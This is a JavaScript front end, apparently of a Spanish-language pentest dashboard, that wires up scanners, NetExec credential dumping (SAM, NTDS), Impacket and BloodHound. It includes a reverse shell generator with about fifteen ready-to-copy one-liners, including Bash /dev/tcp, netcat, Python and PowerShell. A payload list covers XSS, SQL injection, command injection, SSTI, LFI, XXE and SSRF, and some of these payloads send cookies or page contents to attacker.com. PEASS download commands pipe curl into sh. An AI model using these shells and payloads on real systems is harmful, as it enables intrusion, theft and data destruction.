                    ${m.note ? `<div style="font-size:11px;color:var(--text-muted);margin-top:2px">${m.note}</div>` : ''}
                </div>
                ${m.mode !== null ? `<div class="hashid-match-mode">${m.hashcatMode}</div>` : ''}
                ${m.mode !== null ? `<button class="btn btn-ghost" onclick="switchTool('hashcat')" style="padding:4px 10px;font-size:11px">→ Hashcat</button>` : ''}`;
            c.appendChild(card);
        });
        toast(`${result.matches.length} tipo(s) identificados`, 'success');
    } catch (e) { toast('Error al identificar hash', 'error'); }
}

// ─── RUSTSCAN ──────────────────────────────────────────────────
async function loadRustscanPresets() {
    try {
        const presets = await fetch('/api/rustscan/presets').then(r => r.json());
        const c = document.getElementById('rustscan-presets'); if (!c) return;
        c.innerHTML = '';
        presets.forEach(p => {
            const chip = document.createElement('span'); chip.className = 'template-chip';
            chip.textContent = p.name; chip.title = p.flags;
            chip.onclick = () => document.getElementById('rustscan-nmap-args').value = p.flags;
            c.appendChild(chip);
        });
    } catch {}
}
async function runRustscan() {
    const target = document.getElementById('rustscan-target').value.trim();
    if (!target) { appendLine('rustscan','[!] Target requerido','warn'); return; }
    const options = {
        ulimit: document.getElementById('rustscan-ulimit').value,
        nmapArgs: document.getElementById('rustscan-nmap-args').value.trim() || null
    };
    const btn = document.getElementById('rustscan-run-btn'); btn.disabled = true;
    await streamPost('rustscan', '/api/rustscan/scan', { target, options });
    btn.disabled = false;
}

// ─── FEROXBUSTER ───────────────────────────────────────────────
async function loadFeroxbusterWordlists() {
    try {
        const wls = await fetch('/api/feroxbuster/wordlists').then(r => r.json());
        const c = document.getElementById('feroxbuster-wordlists'); if (!c) return;
        c.innerHTML = '';
        wls.forEach(p => {
            const chip = document.createElement('span'); chip.className = 'template-chip';
            chip.textContent = p.split('/').pop(); chip.title = p;
            chip.onclick = () => document.getElementById('feroxbuster-wordlist-path').value = p;
            c.appendChild(chip);
        });
    } catch {}
}
async function runFeroxbuster() {
    const url = document.getElementById('feroxbuster-url').value.trim();
    if (!url) { appendLine('feroxbuster','[!] URL requerida','warn'); return; }
    const options = {
        extensions: document.getElementById('feroxbuster-ext').value.trim() || null,
        wordlist: document.getElementById('feroxbuster-wordlist-path').value.trim() || null,
        depth: document.getElementById('feroxbuster-depth').value,
        extractLinks: document.getElementById('feroxbuster-extract').checked
    };
    const btn = document.getElementById('feroxbuster-run-btn'); btn.disabled = true;
    await streamPost('feroxbuster', '/api/feroxbuster/scan', { url, options });
    btn.disabled = false;
}

// ─── NETEXEC ───────────────────────────────────────────────────
async function loadNetExecProtocols() {
    try {
        const ps = await fetch('/api/netexec/protocols').then(r => r.json());
        const sel = document.getElementById('nxc-protocol'); if (!sel) return;
        ps.forEach(p => { const o = document.createElement('option'); o.value = p.id; o.textContent = `${p.name} - ${p.desc}`; sel.appendChild(o); });
    } catch {}
}
async function loadNetExecModules() {
    try {
        const ms = await fetch('/api/netexec/modules').then(r => r.json());
        const sel = document.getElementById('nxc-module'); if (!sel) return;
        ms.forEach(m => { const o = document.createElement('option'); o.value = m; o.textContent = m; sel.appendChild(o); });
    } catch {}
}
async function runNetExec() {
    const protocol = document.getElementById('nxc-protocol').value;
    const target = document.getElementById('nxc-target').value.trim();
    if (!target) { appendLine('netexec','[!] Target requerido','warn'); return; }
    const options = {
        username: document.getElementById('nxc-user').value.trim() || null,
        password: document.getElementById('nxc-pass').value.trim() || null,
        domain: document.getElementById('nxc-domain').value.trim() || null,
        module: document.getElementById('nxc-module').value || null,
        shares: document.getElementById('nxc-shares').checked,
        users: document.getElementById('nxc-users').checked,
        groups: document.getElementById('nxc-groups').checked,
        sam: document.getElementById('nxc-sam').checked,
        ntds: document.getElementById('nxc-ntds').checked,
        laps: document.getElementById('nxc-laps').checked,
        command: document.getElementById('nxc-command').value.trim() || null
    };
    const btn = document.getElementById('nxc-run-btn'); btn.disabled = true;
    await streamPost('netexec', '/api/netexec/run', { protocol, target, options });
    btn.disabled = false;
}

// ─── IMPACKET ──────────────────────────────────────────────────
let impacketToolsData = [];
async function loadImpacketTools() {
    try {
        impacketToolsData = await fetch('/api/impacket/tools').then(r => r.json());
        const sel = document.getElementById('impacket-tool'); if (!sel) return;
        impacketToolsData.forEach(t => { const o = document.createElement('option'); o.value = t.id; o.textContent = t.name; sel.appendChild(o); });
        updateImpacketUI();
    } catch {}
}
function updateImpacketUI() {
    const tid = document.getElementById('impacket-tool').value;
    const tool = impacketToolsData.find(t => t.id === tid);
    const ex = document.getElementById('impacket-extra-row'); if (!ex) return;
    ex.innerHTML = '';
    if (tool && tool.extra_args) {
        tool.extra_args.forEach(arg => {
            const div = document.createElement('div'); div.className = 'form-group';
            div.innerHTML = `<label>${arg.label}</label><input type="text" class="form-input" id="impacket-arg-${arg.id}" placeholder="${arg.placeholder||''}" spellcheck="false">`;
            ex.appendChild(div);
        });
    }
}
async function runImpacket() {
    const toolId = document.getElementById('impacket-tool').value;
    const target = document.getElementById('impacket-target').value.trim();
    if (!target) { appendLine('impacket','[!] Target requerido','warn'); return; }
    
    const tool = impacketToolsData.find(t => t.id === toolId);
    let options = {};
    if (tool && tool.extra_args) {
        tool.extra_args.forEach(arg => {
            options[arg.id] = document.getElementById(`impacket-arg-${arg.id}`).value.trim() || null;
        });
    }
    const btn = document.getElementById('impacket-run-btn'); btn.disabled = true;
    await streamPost('impacket', '/api/impacket/run', { tool: toolId, target, options });
    btn.disabled = false;
}

// ─── BLOODHOUND ────────────────────────────────────────────────
async function loadBloodhoundCollections() {
    try {
        const cs = await fetch('/api/bloodhound/collections').then(r => r.json());
        const sel = document.getElementById('bh-collection'); if (!sel) return;
        cs.forEach(c => { const o = document.createElement('option'); o.value = c.id; o.textContent = c.name; sel.appendChild(o); });
    } catch {}
}
async function runBloodhound() {
    const domain = document.getElementById('bh-domain').value.trim();
    if (!domain) { appendLine('bloodhound','[!] Dominio requerido','warn'); return; }
    const options = {
        domain: domain,
        dc: document.getElementById('bh-dc').value.trim() || null,
        username: document.getElementById('bh-user').value.trim() || null,
        password: document.getElementById('bh-pass').value || null,
        collectionMethod: document.getElementById('bh-collection').value,
        zip: document.getElementById('bh-zip').checked,
        dnsTcp: document.getElementById('bh-dns-tcp').checked
    };
    const btn = document.getElementById('bh-run-btn'); btn.disabled = true;
    await streamPost('bloodhound', '/api/bloodhound/ingest', { options });
    btn.disabled = false;
}

// ─── PEASS ─────────────────────────────────────────────────────
function updatePeassCommands() {
    const os = document.getElementById('peass-os').value;
    const lhost = document.getElementById('peass-lhost').value.trim() || '10.0.0.1';
    const port = document.getElementById('peass-port').value || 8000;
    
    let commands = [];
    if (os === 'linux') {
        commands = [
            `curl -L http://${lhost}:${port}/linpeas.sh | sh`,
            `wget -qO- http://${lhost}:${port}/linpeas.sh | sh`
        ];
    } else if (os === 'windows') {
        commands = [
            `curl.exe http://${lhost}:${port}/winPEASx64.exe -o winpeas.exe ; .\\winpeas.exe`,
            `certutil.exe -urlcache -split -f http://${lhost}:${port}/winPEASx64.exe winpeas.exe ; .\\winpeas.exe`
        ];
    } else if (os === 'mac') {
        commands = [
            `curl -L http://${lhost}:${port}/macPEAS.sh | sh`
        ];
    }
    
    const c = document.getElementById('peass-commands'); if (!c) return;
    c.innerHTML = '';
    commands.forEach(cmd => {
        const item = document.createElement('div'); item.className = 'payload-item';
        item.style.marginBottom = '5px';
        item.innerHTML = `<span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:var(--font-mono);font-size:12px">${escHtml(cmd)}</span><span class="copy-hint">copiar</span>`;
        item.onclick = () => copyText(cmd);
        c.appendChild(item);
    });
}
async function servePeass() {
    const os = document.getElementById('peass-os').value;
    const port = document.getElementById('peass-port').value;
    await streamPost('peass', '/api/peass/serve', { os, port });
    updatePeassCommands();
}

// ─── TRUFFLEHOG ────────────────────────────────────────────────
async function loadTrufflehogSources() {
    try {
        const srcs = await fetch('/api/trufflehog/sources').then(r => r.json());
        const sel = document.getElementById('trufflehog-source'); if (!sel) return;
        srcs.forEach(s => { const o = document.createElement('option'); o.value = s.id; o.textContent = s.name; sel.appendChild(o); });
    } catch {}
}
async function runTrufflehog() {
    const target = document.getElementById('trufflehog-target').value.trim();
    if (!target) { appendLine('trufflehog','[!] Target requerido','warn'); return; }
    const source = document.getElementById('trufflehog-source').value;
    const options = {
        onlyVerified: document.getElementById('trufflehog-only-verified').checked,
        json: document.getElementById('trufflehog-json').checked
    };
    const btn = document.getElementById('trufflehog-run-btn'); btn.disabled = true;
    await streamPost('trufflehog', '/api/trufflehog/scan', { source, target, options });
    btn.disabled = false;
}

// ─── GITLEAKS ──────────────────────────────────────────────────
async function loadGitleaksModes() {
    try {
        const ms = await fetch('/api/gitleaks/modes').then(r => r.json());
        const sel = document.getElementById('gitleaks-source'); if (!sel) return;
        ms.forEach(m => { const o = document.createElement('option'); o.value = m.id; o.textContent = m.name; sel.appendChild(o); });
    } catch {}
}
async function runGitleaks() {
    const target = document.getElementById('gitleaks-target').value.trim();
    if (!target) { appendLine('gitleaks','[!] Target requerido','warn'); return; }
    const mode = document.getElementById('gitleaks-source').value;
    const options = {
        verbose: document.getElementById('gitleaks-verbose').checked
    };
    const btn = document.getElementById('gitleaks-run-btn'); btn.disabled = true;
    await streamPost('gitleaks', '/api/gitleaks/scan', { mode, target, options });
    btn.disabled = false;
}

// ─── GITROB ────────────────────────────────────────────────────
async function runGitrob() {
    const target = document.getElementById('gitrob-target').value.trim();
    if (!target) { appendLine('gitrob','[!] Org/User requerido','warn'); return; }
    const options = {
        githubToken: document.getElementById('gitrob-github-token').value.trim() || null,
        noServer: document.getElementById('gitrob-no-server').checked
    };
    const btn = document.getElementById('gitrob-run-btn'); btn.disabled = true;
    await streamPost('gitrob', '/api/gitrob/scan', { target, options });
    btn.disabled = false;
}

// ─── ENCODER/DECODER ─────────────────────────────────────────
function runEncoder() {
    const input  = document.getElementById('encoder-input').value;
    const mode   = document.getElementById('encoder-mode').value;
    const output = document.getElementById('encoder-output');
    try {
        let result = '';
        switch(mode) {
            case 'base64e': result = btoa(unescape(encodeURIComponent(input))); break;
            case 'base64d': result = decodeURIComponent(escape(atob(input))); break;
            case 'hexe':    result = [...input].map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join(' '); break;
            case 'hexd':    result = input.replace(/\s/g,'').match(/.{2}/g)?.map(b => String.fromCharCode(parseInt(b,16))).join('') || ''; break;
            case 'urle':    result = encodeURIComponent(input); break;
            case 'urld':    result = decodeURIComponent(input); break;
            case 'htmle':   result = input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#039;'); break;
            case 'htmld':   const d=document.createElement('div'); d.innerHTML=input; result=d.textContent; break;
            case 'rot13':   result = input.replace(/[a-zA-Z]/g,c => String.fromCharCode((c<='Z'?90:122)-(('Z'.charCodeAt(0)-c.charCodeAt(0)+13)%26))); break;
            case 'bin':     result = [...input].map(c => c.charCodeAt(0).toString(2).padStart(8,'0')).join(' '); break;
            case 'bind':    result = input.replace(/\s/g,'').match(/.{8}/g)?.map(b => String.fromCharCode(parseInt(b,2))).join('') || ''; break;
            case 'jwt':     try { const parts = input.split('.'); result = parts.slice(0,2).map(p => { try { return JSON.stringify(JSON.parse(atob(p.replace(/-/g,'+').replace(/_/g,'/'))),null,2); } catch { return p; } }).join('\n---\n'); } catch { result = 'JWT inválido'; } break;
            case 'md5h':    result = '[MD5] Requiere crypto (backend) — usa Hash Identifier para identificar, no para generar'; break;
            case 'sha1h':   result = '[SHA-1] Requiere crypto (backend)'; break;
            case 'sha256h': result = '[SHA-256] Requiere crypto (backend)'; break;
            default: result = input;
        }
        output.value = result;
        toast('Procesado', 'success', 1500);
    } catch (e) { output.value = `Error: ${e.message}`; toast('Error al procesar', 'error'); }
}
function swapEncoderIO() {
    const inp = document.getElementById('encoder-input'); const out = document.getElementById('encoder-output');
    const tmp = inp.value; inp.value = out.value; out.value = tmp;
}
function clearEncoder() { document.getElementById('encoder-input').value = ''; document.getElementById('encoder-output').value = ''; }

// ─── REVERSE SHELL GENERATOR ─────────────────────────────────
const REVERSE_SHELLS = (ip, port) => [
    { lang: 'Bash', code: `bash -i >& /dev/tcp/${ip}/${port} 0>&1` },
    { lang: 'Bash (196)', code: `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196` },
    { lang: 'sh UDP', code: `sh -i >& /dev/udp/${ip}/${port} 0>&1` },
    { lang: 'Netcat', code: `nc -e /bin/sh ${ip} ${port}` },
    { lang: 'Netcat (OpenBSD)', code: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port} >/tmp/f` },
    { lang: 'Python 3', code: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    { lang: 'Python 2', code: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
    { lang: 'PHP', code: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
    { lang: 'Perl', code: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
    { lang: 'Ruby', code: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
    { lang: 'Go', code: `package main;import("net";"os/exec";"time");func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();time.Sleep(1)}` },
    { lang: 'Java', code: `Runtime r = Runtime.getRuntime();String[] commands = {"/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done"};Process p = r.exec(commands);` },
    { lang: 'PowerShell', code: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
    { lang: 'Lua', code: `lua -e "require('socket');t=socket.tcp();t:connect('${ip}','${port}');while true do r,x=t:receive();f=io.popen(r,'r');s=f:read('*a');t:send(s);end;"` },
    { lang: 'Awk', code: `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
];

function generateRevShells() {
    const ip   = document.getElementById('revshell-ip').value.trim();
    const port = document.getElementById('revshell-port').value.trim();
    if (!ip || !port) { toast('Introduce LHOST y LPORT', 'error'); return; }
    const c = document.getElementById('revshell-results'); c.innerHTML = '';
    REVERSE_SHELLS(ip, port).forEach(rs => {
        const card = document.createElement('div'); card.className = 'revshell-card';
        card.innerHTML = `
            <div class="revshell-header">
                <span class="revshell-lang">${rs.lang}</span>
                <button class="btn btn-ghost" onclick="copyText(${JSON.stringify(rs.code)})" style="padding:4px 10px;font-size:11px">📋 Copiar</button>
            </div>
            <div class="revshell-code">${escHtml(rs.code)}</div>`;
        c.appendChild(card);
    });
    toast(`${REVERSE_SHELLS(ip,port).length} payloads generados`, 'success');
}

function escHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

async function copyText(text) {
    try { await navigator.clipboard.writeText(text); toast('Copiado al portapapeles', 'success', 1500); } catch { toast('Error al copiar', 'error'); }
}

// ─── PAYLOAD GENERATOR ────────────────────────────────────────
const PAYLOADS = {
    xss: [
        `<script>alert(1)</script>`,
        `<img src=x onerror=alert(1)>`,
        `<svg onload=alert(1)>`,
        `<body onload=alert(1)>`,
        `<iframe src="javascript:alert(1)">`,
        `"><script>alert(document.cookie)</script>`,
        `'><img src=x onerror=alert(1)>`,
        `<input autofocus onfocus=alert(1)>`,
        `<details open ontoggle=alert(1)>`,
        `<math href="javascript:alert(1)">CLICK</math>`,
        `javascript:alert(1)`,
        `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`,
        `<img src=1 onerror="fetch('http://attacker.com/?x='+btoa(document.body.innerHTML))">`,
        `<object data="javascript:alert(1)">`,
        `<marquee onstart=alert(1)>XSS</marquee>`,
    ],
    sqli: [
        `' OR '1'='1`,
        `' OR 1=1--`,
        `' OR 1=1#`,
        `' OR '1'='1'--`,
        `admin'--`,
        `1' ORDER BY 1--`,
        `1' ORDER BY 2--`,
        `1' ORDER BY 3--`,
        `1' UNION SELECT NULL--`,
        `1' UNION SELECT NULL,NULL--`,
        `1' UNION SELECT NULL,NULL,NULL--`,
        `' UNION SELECT user(),database(),version()--`,
        `' UNION SELECT table_name,NULL FROM information_schema.tables--`,
        `'; DROP TABLE users--`,
        `1 AND SLEEP(5)--`,
        `1 AND 1=2 UNION SELECT @@version--`,
        `' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--`,
        `'; EXEC xp_cmdshell('whoami')--`,
        `1' WAITFOR DELAY '0:0:5'--`,
    ],
    cmdi: [
        `; whoami`,
        `| whoami`,
        `& whoami`,
        `&& whoami`,
        `\`whoami\``,
        `$(whoami)`,
        `; cat /etc/passwd`,
        `; id`,
        `; uname -a`,
        `| net user`,
        `& dir`,
        `; ping -c 1 attacker.com`,
        `; curl http://attacker.com/$(whoami)`,
        `%0a whoami`,
        `%0d%0a whoami`,
        `{cat,/etc/passwd}`,
        `<(cat /etc/passwd)`,
    ],
    ssti: [
        `{{7*7}}`,
        `${7*7}`,
        `<%= 7*7 %>`,
        `#{7*7}`,
        `*{7*7}`,
        `{{config}}`,
        `{{self.__dict__}}`,
        `{{''.__class__.__mro__[1].__subclasses__()}}`,
        `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
        `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
        `{#each (7*7)}}`,
        `{% for i in range(1,10) %}{{i}}{%endfor%}`,
        `\${T(java.lang.Runtime).getRuntime().exec('id')}`,
        `#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex`,
    ],
    lfi: [
        `../../../etc/passwd`,
        `../../../../etc/passwd`,
        `../../../../../etc/passwd`,
        `..%2f..%2f..%2fetc%2fpasswd`,
        `....//....//etc/passwd`,
        `/etc/passwd`,
        `/etc/shadow`,
        `/proc/self/environ`,
        `/var/log/apache2/access.log`,
        `/var/log/nginx/access.log`,
        `php://filter/convert.base64-encode/resource=index.php`,
        `php://input`,
        `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`,
        `zip://uploaded.zip%23shell`,
        `expect://id`,
        `C:\\Windows\\System32\\drivers\\etc\\hosts`,
        `..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts`,
    ],
    xxe: [
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.xml">]><foo>&xxe;</foo>`,
        `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
        `<!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]><userInfo><firstName>John</firstName><lastName>&ent;</lastName></userInfo>`,
    ],
    ssrf: [
        `http://127.0.0.1/`,
        `http://localhost/`,
        `http://169.254.169.254/latest/meta-data/`,
        `http://169.254.169.254/latest/user-data/`,
        `http://[::]:80/`,
        `http://0.0.0.0:80/`,
        `dict://127.0.0.1:11211/stat`,
        `gopher://127.0.0.1:25/xHELO%20localhost`,
        `file:///etc/passwd`,
        `http://attacker.com/ssrf-probe`,
        `http://192.168.1.1/`,
        `http://10.0.0.1/`,
        `sftp://attacker.com:11111/`,
        `ldap://attacker.com/dc=test`,
    ],
    open_redirect: [
        `//attacker.com`,
        `https://attacker.com`,
        `//attacker.com/%2F..`,
        `http://attacker.com`,
        `/\tattacker.com`,
        `/%09/attacker.com`,
        `//google%E3%80%82com`,
        `////attacker.com`,
        `https:attacker.com`,
        `https://attacker.com#.victim.com`,
    ],
};

let currentPayloads = [];

function renderPayloads() {
    const type = document.getElementById('payload-type')?.value || 'xss';
    const list = document.getElementById('payload-list');
    if (!list) return;
    currentPayloads = PAYLOADS[type] || [];
    _renderPayloadItems(currentPayloads);
}

function filterPayloads() {
    const q = document.getElementById('payload-filter').value.toLowerCase();
    const filtered = currentPayloads.filter(p => p.toLowerCase().includes(q));
    _renderPayloadItems(filtered);
}

function _renderPayloadItems(items) {
    const list = document.getElementById('payload-list');
    if (!list) return;
    list.innerHTML = '';
    items.forEach(p => {
        const item = document.createElement('div'); item.className = 'payload-item';
        item.innerHTML = `<span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escHtml(p)}</span><span class="copy-hint">click para copiar</span>`;
        item.onclick = () => copyText(p);
        list.appendChild(item);
    });
}

// ─── WORDLIST MANAGER ────────────────────────────────────────
async function loadWordlists() {
    try {
        const wls = await fetch('/api/wordlists/wellknown').then(r => r.json());
        const g = document.getElementById('wellknown-wordlists'); if (!g) return;
        g.innerHTML = '';
        wls.forEach(w => {
            const item = document.createElement('div'); item.className = 'wordlist-item';
            item.innerHTML = `<div class="wordlist-name">${w.name}</div><div class="wordlist-path">${w.path}</div><div class="wordlist-size">—</div><div style="font-size:11px;color:var(--text-muted);margin-top:3px">${w.desc}</div>`;
            item.onclick = () => previewWordlist(w.path, w.name);
            g.appendChild(item);
        });
    } catch {}
}

async function previewWordlist(filePath, name) {
    const box = document.getElementById('wordlist-preview-box');
    const nameEl = document.getElementById('wl-preview-name');
    const content = document.getElementById('wl-preview-content');
    nameEl.textContent = name;
    box.style.display = 'flex';
    content.textContent = 'Cargando...';
    try {
        const data = await fetch(`/api/wordlists/preview?path=${encodeURIComponent(filePath)}&lines=30`).then(r => r.json());
        if (data.error) { content.textContent = `No disponible: ${data.error}`; return; }
        document.getElementById('wl-preview-size').textContent = `${data.totalLines.toLocaleString()} líneas`;
        content.textContent = data.preview;
    } catch (e) { content.textContent = `Error: ${e.message}`; }
}

// ─── CVE SEARCH ───────────────────────────────────────────────
async function searchCVE() {
    const query = document.getElementById('cve-query').value.trim(); if (!query) return;
    hideEmpty('cve'); appendLine('cve', `Consultando NVD: "${query}"...`, 'info');
    try {
        let url;
        if (/^CVE-\d{4}-\d+$/i.test(query)) url = `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${query.toUpperCase()}`;
        else url = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(query)}&resultsPerPage=10`;
        const data = await fetch(url).then(r => r.json());
        const vulns = data.vulnerabilities || [];
        if (!vulns.length) { appendLine('cve','Sin resultados','warn'); return; }
        appendLine('cve', `─── ${data.totalResults} resultados (mostrando ${vulns.length}) ───`, 'done');
        vulns.forEach(v => {
            const cve = v.cve; const id = cve.id;
            const desc = cve.descriptions?.find(d => d.lang==='en')?.value || 'Sin descripción';
            const cvss3 = cve.metrics?.cvssMetricV31?.[0]?.cvssData;
            const cvss2 = cve.metrics?.cvssMetricV2?.[0]?.cvssData;
            const score = cvss3?.baseScore ?? cvss2?.baseScore ?? 'N/A';
            const sev   = cvss3?.baseSeverity ?? cvss2?.baseSeverity ?? '';
            appendLine('cve', '');
            appendLine('cve', `▸ ${id}  [CVSS: ${score} ${sev}]  ${cve.published?.slice(0,10)||'N/A'}`, 'done');
            appendLine('cve', `  ${desc.slice(0,200)}${desc.length>200?'...':''}`);
        });
    } catch (e) { appendLine('cve',`[ERROR] ${e.message}`,'error'); appendLine('cve','[HINT] NVD: máx 5 req/30s sin API key','warn'); }
}

// ─── HISTORY ─────────────────────────────────────────────────
async function loadHistory() {
    const tool   = document.getElementById('history-filter-tool')?.value;
    const params = tool ? `?tool=${encodeURIComponent(tool)}` : '';
    try {
        const entries = await fetch(`/api/history${params}`).then(r => r.json());
        renderHistoryList(entries);
        updateHistoryBadge(entries.length);
        // Populate tool filter
        const sel = document.getElementById('history-filter-tool');
        if (sel && sel.options.length <= 1) {
            const tools = [...new Set(entries.map(e => e.tool))];
            tools.forEach(t => { const o = document.createElement('option'); o.value = t; o.textContent = t; sel.appendChild(o); });
        }
    } catch {}
}

function updateHistoryBadge(count) {
    if (count === undefined) { fetch('/api/history?limit=1').then(r => r.json()).then(d => updateHistoryBadge(d.length || 0)).catch(()=>{}); return; }
    const b = document.getElementById('history-count-badge');
    if (!b) return;
    if (count > 0) { b.textContent = count; b.style.display = 'inline-flex'; }
    else b.style.display = 'none';
}

function renderHistoryList(entries) {
    const list = document.getElementById('history-list'); if (!list) return;
    if (!entries.length) { list.innerHTML = '<p style="color:var(--text-muted);font-size:13px;padding:12px">Sin historial registrado</p>'; return; }
    list.innerHTML = '';
    entries.forEach(e => {
        const item = document.createElement('div'); item.className = 'history-item';
        const ts = new Date(e.timestamp).toLocaleString('es-ES',{dateStyle:'short',timeStyle:'medium'});
        const sc = e.status==='done'?'badge-done':e.status==='error'?'badge-error':'badge-run';
        item.innerHTML = `
            <span class="history-tool-badge">${e.tool}</span>
            <span class="history-command">${e.command||e.target||'—'}</span>
            <span class="history-target">${e.target||'—'}</span>
            <span class="history-time">${ts}</span>
            <span class="history-status"><span class="badge ${sc}">${e.status}</span></span>
            <button class="history-delete-btn" onclick="deleteHistoryEntry(${e.id},this)" title="Eliminar">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
            </button>`;
        list.appendChild(item);
    });
}

async function deleteHistoryEntry(id, btn) {
    await fetch(`/api/history/${id}`, { method: 'DELETE' });
    btn.closest('.history-item').remove();
    updateHistoryBadge();
}

async function clearHistory() {
    if (!confirm('¿Limpiar todo el historial? Esta acción no se puede deshacer.')) return;
    await fetch('/api/history', { method: 'DELETE' });
    loadHistory();
    toast('Historial limpiado', 'info');
}

// ─── REPORT ──────────────────────────────────────────────────
function downloadReport() {
    const title  = prompt('Título del informe:', 'CyberLab — Informe de Seguridad') || 'CyberLab — Informe';
    const scope  = prompt('Alcance / target principal:', '') || 'No especificado';
    const url    = `/api/report/html?title=${encodeURIComponent(title)}&scope=${encodeURIComponent(scope)}`;
    const a = document.createElement('a'); a.href = url; a.download = ''; document.body.appendChild(a); a.click(); a.remove();
    toast('Informe generado y descargado', 'success');
}

// ─── File input labels ────────────────────────────────────────
function setupFileInput(inputId, labelId, name) {
    const input = document.getElementById(inputId); const label = document.getElementById(labelId);
    if (!input || !label) return;
    input.addEventListener('change', () => {
        const file = input.files[0];
        const span = label.querySelector('span');
        if (span) span.textContent = file ? file.name : name;
    });
}

// ─── Init ─────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', async () => {
    // File inputs
    setupFileInput('john-hashfile',  'john-hashfile-label',  'Hash file');
    setupFileInput('john-wordlist',  'john-wordlist-label',  'Wordlist');
    setupFileInput('hc-hashfile',    'hc-hashfile-label',    'Hash file');
    setupFileInput('hc-wordlist',    'hc-wordlist-label',    'Wordlist');
    setupFileInput('hydra-userlist', 'hydra-userlist-label', 'User list');
    setupFileInput('hydra-passlist', 'hydra-passlist-label', 'Pass list');

    // Load data
    await Promise.all([
        loadNmapTemplates(),
        loadHashcatModes(),
        loadSqlmapTechniques(),
        loadGobusterWordlists(),
        loadNiktoTuning(),
        loadHydraServices(),
        loadHarvesterSources(),
        loadNucleiTags(),
        loadCMEProtocols(),
        loadTsharkInterfaces(),
        loadTsharkFilters(),
        loadRustscanPresets(),
        loadFeroxbusterWordlists(),
        loadNetExecProtocols(),
        loadNetExecModules(),
        loadImpacketTools(),
        loadBloodhoundCollections(),
        loadTrufflehogSources(),
        loadGitleaksModes(),
        checkBackendStatus(),
        checkZapStatus(),
    ]);

    updateTopbar('nmap');
    updateHistoryBadge();
    renderPayloads();
    if (document.getElementById('peass-os')) updatePeassCommands();

    // Keyboard shortcuts
    document.getElementById('cve-query')?.addEventListener('keydown', e => { if (e.key === 'Enter') searchCVE(); });
    document.getElementById('nmap-target')?.addEventListener('keydown', e => { if (e.key === 'Enter') runNmap(); });
    document.getElementById('hashid-input')?.addEventListener('keydown', e => { if (e.key === 'Enter') identifyHash(); });
    document.getElementById('revshell-port')?.addEventListener('keydown', e => { if (e.key === 'Enter') generateRevShells(); });
    document.getElementById('payload-filter')?.addEventListener('input', filterPayloads);

    // Polling
